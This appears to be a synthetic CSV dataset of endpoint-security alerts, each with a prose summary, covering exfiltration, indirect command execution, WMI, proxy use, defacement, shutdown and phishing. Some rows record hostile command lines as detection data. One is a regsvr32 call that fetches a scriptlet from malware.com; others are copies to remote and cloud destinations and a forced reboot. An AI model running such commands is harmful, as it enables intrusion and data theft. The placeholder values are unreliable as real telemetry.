AlertID,AlertTimestamp,MachineId,ComputerName,Severity,AlertName,AlertType,Category,AlertDescription,Status,ExtendedProperties,event_id,event_type,event_timestamp,event_category,severity,detect_description,detect_id,technique,device_name,file_name,file_size,src_path,dst_path,user_name,process_name,AlertSeverity,Recommendation,RuleName,Source,Tactic,Technique,AlertCategory,HostName,FilePath,ProcessName,CommandLine,MD5Hash,SHA256Hash,IPAddress,UserName,ProcessID,ParentProcessID,DetectionId,event_description,Details,EndpointID,EndpointName,ParentProcessName,ParentProcessPath,ProcessPath,host,user,process,network,detection,FallbackProtocol,DestinationIP,DestinationPort,artifact_hiding,security_control_disablement,Event,Host,User,Action,Reason,event_time,alert_rule_name,technique_name,tactic,process_id,command_line,destination_ip,destination_port,source_ip,source_port,ProcessId,DestinationIp,SourceIp,SourcePort,AlertTimestamps,file_path,file_hash,process_hash,parent_process_name,parent_process_hash,registry_modification,subtype,recommendation,detection_details,product,mitre,endpoint,attack_details,event_severity,protocol,process_command_line,parent_process_command_line,parent_process_id,SourceIP,Protocol,ProcessCommandLine,ParentProcessCommandLine,event_categfory,event_Timestamp,Affected_Hostname,Affected_File_Path,Alert_Source,alert_severity,action_taken,detection_source,ProcessHash,ProcessParentName,ProcessParentPath,ProcessParentHash,tactics,affected_entities,recommendations,source,destination,threat_severity,threat_category,threat_name,indicators,ioc,description,Description,Endpoint,DetectionSource,AlertyDescription,MACAddress,EventLogName,EventLogMessage,AdditionalInfo,AffectedHost,AffectedProcess,AffectedFilePath,Commandline,ParentProcess,DetectionMethod,RecommendedActions,event_catefory,affected_hosts,event_details,event_name,alert_type,event,Field,Operator,Value,Tags,RegistryKey,RegistryValue,type,timestamp,Title,Affected_Image_Path,Timestamp,Injected_Process_Name,Loader_Process_Name,Loader_Technique,event_Source,EventType,EventCategory,TargetResource,Operation,SuspiciousAction,Domain_Controller_IP,Domain_Controller_Name,EntityName,EntityType,Hostname,event_version,event_categorty,kill_chain,image_loaded,target_image_loaded,target_image_name,target_command_line,detection_method,AlertNmae,IP,OS,category,action,event_data,data,ArtifactType,ArtifactPath,ArtifactName,sensor_id,customer_id,event_info,AffectedHostname,AffectedFile_Path,AlertSource,Parent_Process_Name,Injection_Technique,technique_id,subtechnique_id,subtechnique,additional_info,vendor,path,domain,ip_address,Name,event_subtype,src_ip,dst_ip,container_name,image_name,image_digest,registry,command,process_path,username,actor,host_info,event_url,event_hash,event_action,event_source,OperatingSystem,web_server_url,web_server_method,AssignedTo,ClosedTime,DataTTL,DetectionTime,DetectionType,IsIncident,LastUpdateTime,DomainName,DnsName,FullyQualifiedDomainName,NetBiosName,OSPlatform,OSVersion,ProcessorArchitecture,CreationTime,End,FileHash,FileName,Start,VendorName,VendorSeverity,VendorThreatName,trigger,remediation,metadata,process_injection,ControlName,file_write,actions,alert_data,tags,Type,Condition,ImageLoaded,TargetImageLoaded,TargetImageName,TargetCommandLine,KillchainPhase,TechniqueID,Techniqu,Affected_Device,Affected_User,Malicious_Executable,detection_id,detection_time,detection_score,threat_score,device_id,device_external_ip,device_os,device_os_version,policy_name,policy_id,subcategory,rule_name,hostname,ip,process_pid,files,MachineName,sha1_hash,local_ip,public_ip,malware_family,org_id,event_event_name,kill_chain_phases,data_source,DeviceName,DeviceId,OsPlatform,OsVersion,ProcessCreationTime,ParentProcessCreationTime,TargetDevice,TargetDeviceId,TargetOsPlatform,TargetOsVersion,TargetUserName,AlertDDescription,Endpoint_ID,Endpoint_Name,Endpoint_IP,Process_Name,parent_process_pid,c2,native_function_calls,TECHNIQUE,SourceIPAddress,DestinationIPAddress,Domain,ThreatName,IOC,TimestampUtc,SHA256,WebServiceName,WebServicePath,file,parent_process,os,pid,access_type,operation,InjectedProcessName,InjectionTechnique,AleertDescription,AlertDetails,mitre_technique,ContainerImageName,ContainerRuntime,DeploymentMethod,ParentProcessId,EndpointIP,C2Server,ExfiltratedData,ExfiltrationMethod,UserDomain,ProcessParentID,Detection_Details,Process_Path,Process_Command_Line,AffectedImagePath,machine_id,user_id,alert_name,remote_address,remote_port,local_address,local_port,AlertId,RemoteServer,ParentCommandLine,EventID,Hash,ParentHash,ExecutionStatus,event_cagtegory,remediation_steps,AffectedHostInfo,DetectionDetails,TECHNIQUE_NAME,TACTIC,Signer,Process Name,PID,Path,HostIP,KillChain,EndpointDetails,detected_by,details,device,TargetUser,OriginalPermissions,NewPermissions,cloud_infrastructure_modification,CloudProvider,APIOperation,evebnt_category,EntityValue,creationTimeUtc,status,recommendedActions,vendorInformation,properties,src_port,remote_ip,Target,Port,AffectedEndpoints,IndicatorsOfCompromise,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFileSize,TechniqueName,ProcessPid,ParentProcessPid,Direction,RemoteServiceName,RemoteServiceType,RemoteServicePorts,RemoteServiceIpv4,RemoteServiceIpv6,RemoteServiceUrl,RemoteServiceCertificate,RemoteServiceEncryption,RemoteServiceAuthentication,RemoteServiceVersion,RemoteServiceProduct,RemoteServiceOrganization,file_permission_modification,Product,AttackType,AttackDuration,AffectedServices,EventTime,application,threat,affected_host,alert_category,alert_recommendation,alert_details,References,target,attack_name,affected_process,affected_file_path,recommended_actions,host_name,md5_hash,sha256_hash,AlertTimestampUtc,EventId,WebServerUrl,WebServerMethod,process_execution,event_ category,detect_name,rule_description,triggered_rule,remote_server,CloudAccount,endpoint_id,web_service_name,web_service_path,ProcessParentCommandLine,AttackVector,alert_rule_id,alert_state,alert_time,src,process_tree,ioc_type,ioc_value,process_details,host_details,file_info,network_info,email_sender,email_recipient,email_subject,email_urls,email_attachments,ip_addresses,mac_addresses,operating_system,agent_version,group_name,Vendor,Username,name,event_creator,mitre_attack_id,cloud_account,detection_info,URL,file_deletion,AttackTactic,AttackTechnique,EntityId,EntityIp,MachineDomainName,AlertLink,AlertTime,UserInfo,PhishingInfo,DetectionID,EventHash,AffectedEntities,KillChainPhase,RemediationSteps,Alertescription,modified_time,original_hash,current_hash,event)category,combined_data
,,,,,,,,,,,12345678-1234-1234-1234-123456789012,alert,2023-03-08T14:30:00Z,scheduled Transfer,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,Scheduled Transfer Detected,,,,,,,,,,,,,,,,,,,,,,,,,,1234.0,robocopy C:\LocalFolder \\RemoteServer\Share /E,,,,,,,,,,,,,,,,,,,,,,,medium,,,,,,,,,,,,,,,,CrowdStrike Falcon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\RemoteServer\Share,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345678-1234-1234-1234-123456789012. event_type is alert. event_timestamp is 2023-03-08T14:30:00Z. event_category is scheduled Transfer. process_name is cmd.exe. event_description is Scheduled Transfer Detected. command_line is robocopy C:\LocalFolder \\RemoteServer\Share /E. event_severity is medium. detection_source is CrowdStrike Falcon. remote_server is \\RemoteServer\Share. 
,2023-03-08T14:30:00Z,,,High,Data Transfer to Cloud Account Detected,,,"This alert is triggered when a data transfer to a cloud account is detected, which may indicate data exfiltration or suspicious activity. This could be an indication of malicious activity, and warrants further investigation.",,,,,,,,,,,,,,,,,,,,,,,,,,,powershell.exe,Copy-Item C:\LocalFolder -Destination https://mycloudstorage.com/myfolder,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,5678.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Microsoft Defender for Endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345678-1234-1234-1234-123456789012,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1537,,,,,,,,,https://mycloudstorage.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertTimestamp is 2023-03-08T14:30:00Z. Severity is High. AlertName is Data Transfer to Cloud Account Detected. AlertDescription is This alert is triggered when a data transfer to a cloud account is detected, which may indicate data exfiltration or suspicious activity. This could be an indication of malicious activity, and warrants further investigation.. ProcessName is powershell.exe. CommandLine is Copy-Item C:\LocalFolder -Destination https://mycloudstorage.com/myfolder. DetectionSource is Microsoft Defender for Endpoint. AlertId is 12345678-1234-1234-1234-123456789012. EventId is T1537. CloudAccount is https://mycloudstorage.com. "
,,,,,,,,,,,kldkfkg02,detect,2023-03-09T09:00:00Z,Suspicious Web Service Connection,medium,,,,,,,,,,C:\Windows\System32\svchost.exe,,,,,,,,,,,,,,,,,,,CrowdStrike detected suspicious network activity related to a web service on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,,,,,,10.0.0.1,443.0,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\svchost.exe -k DcomLaunch,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345678-1234-1234-1234-123456789def,W3SVC,C:\Windows\System32\inetsrv\w3wp.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is kldkfkg02. event_type is detect. event_timestamp is 2023-03-09T09:00:00Z. event_category is Suspicious Web Service Connection. severity is medium. process_name is C:\Windows\System32\svchost.exe. event_description is CrowdStrike detected suspicious network activity related to a web service on the endpoint.. destination_ip is 10.0.0.1. process_command_line is C:\Windows\System32\svchost.exe -k DcomLaunch. endpoint_id is 12345678-1234-1234-1234-123456789def. web_service_name is W3SVC. web_service_path is C:\Windows\System32\inetsrv\w3wp.exe. 
99782345,2022-03-15T10:30:00Z,,,High,Potential website defacement,Behavior,Web,"Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion.",,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\iexplore.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,iexplore.exe https://example.com/,,,,,,,,,,,C:\Windows\SysWOW64\explorer.exe,,,,,,,,,,,,,,,,EDR,,,,,,,,C:\inetpub\wwwroot\index.html,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,example-device,123456.0,Windows,10.0.19042,2022-03-15T10:15:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,Web,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 99782345. AlertTimestamp is 2022-03-15T10:30:00Z. Severity is High. AlertName is Potential website defacement. AlertType is Behavior. Category is Web. AlertDescription is Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion.. ProcessName is C:\Windows\System32\iexplore.exe. ProcessCommandLine is iexplore.exe https://example.com/. ProcessParentName is C:\Windows\SysWOW64\explorer.exe. DetectionSource is EDR. AffectedFilePath is C:\inetpub\wwwroot\index.html. DeviceName is example-device. OsPlatform is Windows. OsVersion is 10.0.19042. ProcessCreationTime is 2022-03-15T10:15:00Z. ProcessParentCommandLine is explorer.exe. AttackVector is Web. "
,,,,,,,,,,,123456789,detect,2023-03-06T14:02:30Z,system shutdown,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,A system shutdown or reboot has been initiated.,,,,,,,,,,,,,,,,,,,,,,,System Shutdown/Reboot,,,,,,,,,,,,,,,,,,,,,,,,,,,high,,shutdown /r /t 0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,malware,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1529,active,2023-03-06T14:02:30Z,"{'ip': '192.168.1.100', 'hostname': 'DESKTOP-1234', 'username': 'user1'}","[{'pid': 1234, 'name': 'cmd.exe', 'username': 'user1', 'start_time': '2023-03-06T14:00:00Z'}, {'pid': 5678, 'ppid': 1234, 'name': 'cmd.exe', 'username': 'user1', 'start_time': '2023-03-06T14:00:00Z'}, {'pid': 9012, 'ppid': 5678, 'name': 'shutdown.exe', 'username': 'user1', 'start_time': '2023-03-06T14:02:30Z'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 123456789. event_type is detect. event_timestamp is 2023-03-06T14:02:30Z. event_category is system shutdown. process_name is cmd.exe. event_description is A system shutdown or reboot has been initiated.. alert_rule_name is System Shutdown/Reboot. event_severity is high. process_command_line is shutdown /r /t 0. alert_type is malware. alert_rule_id is T1529. alert_state is active. alert_time is 2023-03-06T14:02:30Z. src ip is 192.168.1.100. src hostname is DESKTOP-1234. src username is user1. 
,,,,,,,,,,,03040rt0f,threat,2022-04-01T12:34:56.789Z,Windows Management Instrumentation,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Detects the use of Windows Management Instrumentation (WMI) for lateral movement or other malicious activities.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,process,wmiprvse.exe,"{'process_name': 'wmiprvse.exe', 'process_path': 'C:\\Windows\\System32\\wbem\\wmiprvse.exe', 'command_line': 'wmiprvse.exe /secured /caller:""NT AUTHORITY\\SYSTEM"" /embedding', 'process_sha256': 'ABC123...', 'parent_process_name': 'svchost.exe', 'parent_process_path': 'C:\\Windows\\System32\\svchost.exe', 'parent_process_command_line': 'svchost.exe -k DcomLaunch', 'parent_process_sha256': 'DEF456...', 'username': 'NT AUTHORITY\\SYSTEM', 'domain': 'NT AUTHORITY', 'process_start_time': '2022-04-01T12:30:00.000Z', 'process_end_time': '2022-04-01T12:34:00.000Z', 'pid': 1234, 'ppid': 5678}","{'hostname': 'DESKTOP-ABC123', 'ip_address': '192.168.1.100', 'mac_address': '12-34-56-78-9A-BC', 'os': 'Windows 10', 'os_version': '20H2', 'os_build': '19042.1083', 'agent_version': '6.22.0.0', 'agent_id': 'ABCDEF...', 'sensor_id': 'GHIJKL...', 'group_name': 'Workstations'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"event_id is 03040rt0f. event_type is threat. event_timestamp is 2022-04-01T12:34:56.789Z. event_category is Windows Management Instrumentation. event_description is Detects the use of Windows Management Instrumentation (WMI) for lateral movement or other malicious activities.. event_severity is high. ioc_type is process. ioc_value is wmiprvse.exe. process_details process_name is wmiprvse.exe. process_details process_path is C:\Windows\System32\wbem\wmiprvse.exe. process_details command_line is wmiprvse.exe /secured /caller:""NT AUTHORITY\SYSTEM"" /embedding. process_details process_sha256 is ABC123.... process_details parent_process_name is svchost.exe. process_details parent_process_path is C:\Windows\System32\svchost.exe. process_details parent_process_command_line is svchost.exe -k DcomLaunch. process_details parent_process_sha256 is DEF456.... process_details username is NT AUTHORITY\SYSTEM. process_details domain is NT AUTHORITY. process_details process_start_time is 2022-04-01T12:30:00.000Z. process_details process_end_time is 2022-04-01T12:34:00.000Z. host_details hostname is DESKTOP-ABC123. host_details ip_address is 192.168.1.100. host_details mac_address is 12-34-56-78-9A-BC. host_details os is Windows 10. host_details os_version is 20H2. host_details os_build is 19042.1083. host_details agent_version is 6.22.0.0. host_details agent_id is ABCDEF.... host_details sensor_id is GHIJKL.... host_details group_name is Workstations. "
30405607356,2023-03-10T18:00:00Z,,,Medium,Indirect Command Execution,,,Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters.,,,,,,,,,,,,,,,,,,,,,Endpoint,Execution,Indirect Command Execution,,,,regsvr32.exe,regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll,,,,,,,,,,,,,,,,,,,,,,,,,,server01,user01,Blocked,Unauthorized command execution,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 30405607356. AlertTimestamp is 2023-03-10T18:00:00Z. Severity is Medium. AlertName is Indirect Command Execution. AlertDescription is Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters.. Source is Endpoint. Tactic is Execution. Technique is Indirect Command Execution. ProcessName is regsvr32.exe. CommandLine is regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll. Host is server01. User is user01. Action is Blocked. Reason is Unauthorized command execution. 
,,,,,,,,,,,12345,detect,2023-03-09T15:45:00Z,proxy,,,,T1090 - Proxy,,,,,,,,,,,,,,,,,,,,,,,,,,Detection of a connection being made through a proxy,,,,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,high,,,,,,,,,,,,,,,,Network Traffic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Proxy Detection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['Investigate the use of a proxy in the environment', 'Identify the source and destination of the proxy traffic', 'Monitor for any further suspicious activity']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'file_name': 'cmd.exe', 'file_path': 'C:\\Windows\\System32\\cmd.exe', 'file_hash': '1a2b3c4d5e6f7g8h9i0j'}","{'destination_ip': '1.2.3.4', 'destination_domain': 'example.com', 'protocol': 'TCP'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345. event_type is detect. event_timestamp is 2023-03-09T15:45:00Z. event_category is proxy. technique is T1090 - Proxy. event_description is Detection of a connection being made through a proxy. tactic is Defense Evasion. event_severity is high. detection_source is Network Traffic. detection_method is Proxy Detection. recommended_actions are Investigate the use of a proxy in the environment; Identify the source and destination of the proxy traffic; Monitor for any further suspicious activity; file_info file_name is cmd.exe. file_info file_path is C:\Windows\System32\cmd.exe. file_info file_hash is 1a2b3c4d5e6f7g8h9i0j. network_info destination_ip is 1.2.3.4. network_info destination_domain is example.com. network_info protocol is TCP. 
111235,2023-03-08T12:00:00.000000Z,,,High,Exfiltration Over Alternative Protocol,,Data Exfiltration,"This alert is triggered when an adversary attempts to exfiltrate data using a protocol or service that is not typically used for this purpose, such as DNS or ICMP, using a command-line interface.",,,,,,,,,,,,,,,,,,,,,,,,,,,,nslookup example.com 8.8.8.8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Behavior Monitoring,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 111235. AlertTimestamp is 2023-03-08T12:00:00.000000Z. Severity is High. AlertName is Exfiltration Over Alternative Protocol. Category is Data Exfiltration. AlertDescription is This alert is triggered when an adversary attempts to exfiltrate data using a protocol or service that is not typically used for this purpose, such as DNS or ICMP, using a command-line interface.. CommandLine is nslookup example.com 8.8.8.8. DetectionMethod is Behavior Monitoring. "
,,,,,,,,,,,T1566,,2023-03-04T13:45:30Z,Phishing,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,An email phishing attempt has been detected.,,,,,,,"{'hostname': 'endpoint-01', 'ip_address': '192.168.1.10', 'os': 'Windows 10', 'process_name': 'outlook.exe', 'process_commandline': '""C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE""', 'process_id': '1234'}","{'username': 'johndoe', 'display_name': 'John Doe', 'email_address': 'johndoe@example.com', 'user_agent': 'Microsoft Outlook', 'ip_address': '192.168.1.20'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,threat,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,spoofed@example.com,johndoe@example.com,Important: Action Required,"['http://malicious.com', 'http://phishing.com']",['invoice.pdf'],,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"event_id is T1566. event_timestamp is 2023-03-04T13:45:30Z. event_category is Phishing. event_description is An email phishing attempt has been detected.. host hostname is endpoint-01. host ip_address is 192.168.1.10. host os is Windows 10. host process_name is outlook.exe. host process_commandline is ""C:\Program Files\Microsoft Office\Office16\OUTLOOK.EXE"". host process_id is 1234. user username is johndoe. user display_name is John Doe. user email_address is johndoe@example.com. user user_agent is Microsoft Outlook. user ip_address is 192.168.1.20. event_severity is High. type is threat. email_sender is spoofed@example.com. email_recipient is johndoe@example.com. email_subject is Important: Action Required. email_urls are http://malicious.com; http://phishing.com; email_attachments are invoice.pdf; "
